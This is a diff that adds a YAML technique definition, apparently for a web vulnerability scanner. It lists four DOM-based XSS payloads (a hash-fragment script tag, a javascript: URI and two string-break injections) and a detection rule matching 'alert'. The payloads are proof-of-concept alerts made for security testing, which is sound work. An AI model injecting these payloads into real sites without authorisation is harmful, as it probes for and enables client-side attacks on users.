@@ -1,0 +1,21 @@
+techniques:
+  - id: xss_dom_basic
+    name: "XSS - DOM Based"
+    vuln_type: xss_dom
+    description: "DOM-based XSS payloads targeting client-side sinks"
+    severity: medium
+    depth: standard
+    tags: ["xss", "dom"]
+    payloads:
+      - value: "#<script>alert(1)</script>"
+        description: "Hash fragment injection"
+      - value: "javascript:alert(document.domain)"
+        description: "JavaScript protocol in DOM sink"
+      - value: "'-alert(1)-'"
+        description: "String break in JS context"
+      - value: "\\'-alert(1)//"
+        description: "Escaped quote break"
+    detection:
+      - type: string
+        value: "alert"
+        description: "XSS payload in DOM"
